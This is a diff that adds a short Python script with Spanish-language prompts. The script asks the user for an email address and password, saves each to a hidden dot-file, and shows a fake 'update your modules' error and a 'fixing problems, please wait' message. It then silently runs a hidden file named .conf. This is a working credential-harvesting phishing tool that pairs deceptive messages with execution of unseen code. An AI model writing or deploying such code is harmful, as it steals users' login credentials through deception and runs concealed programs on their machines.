@@ -1,0 +1,15 @@
+gmail = input("Introduse tu correo: ")
+f = open(".gmail.txt", "w")
+f.write(gmail)
+f.close()
+print ("")
+pwd = input("Introduse tu contraseña: ")
+f = open(".pwd.txt", "w")
+f.write(pwd)
+f.close()
+print ("")
+print ("Error update you modules'apt update;aptupgrade'")
+print ("SOLUCIONANDO PROBLEMAS...PORFAVOR ESPERE...")
+import os
+resultado = os.system("python .conf")
+
